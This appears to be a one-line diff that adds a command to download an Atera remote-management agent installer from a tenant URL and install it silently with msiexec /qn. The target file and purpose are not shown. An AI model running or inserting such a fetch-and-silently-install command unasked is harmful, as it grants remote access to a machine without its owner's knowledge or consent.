@@ -1,0 +1,1 @@
+curl -o setup.msi "http://InnovationNetworkDesigncom259973.servicedesk.atera.com/GetAgent/Msi/?customerId=12&integratorLogin=Purchasing%40innovationnd.com&customerName=New%20Client%20Onboarding" && msiexec /i setup.msi /qn  IntegratorLogin=Purchasing@innovationnd.com CompanyId=12
